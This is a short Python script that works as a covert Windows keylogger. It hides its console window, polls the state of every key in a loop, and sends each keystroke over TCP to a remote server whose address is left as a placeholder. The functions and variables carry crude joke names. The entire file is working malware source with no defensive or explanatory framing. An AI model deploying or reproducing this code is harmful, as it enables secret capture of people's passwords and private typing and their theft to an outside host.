import ctypes
import socket
import time


SERVER_IP = "YOUR_SERVER_IP" # Replace with your server IP
SERVER_PORT = 297 # Replace with your server port

def small_schlong(message):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

            sock.connect((SERVER_IP, SERVER_PORT))

            sock.sendall(message.encode())

    except Exception as e:
        print(f"Error: {e}")

def long_schlong():
    user32 = ctypes.windll.user32
    while True:
        for key in range(8, 256):
            if user32.GetAsyncKeyState(key) & 0x0001:
                longi_schlongi_uwu_nya_daddy = chr(key)
                small_schlong(longi_schlongi_uwu_nya_daddy)
        time.sleep(0.01) # Prevent high CPU usage

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) #Hide the console window
    long_schlong()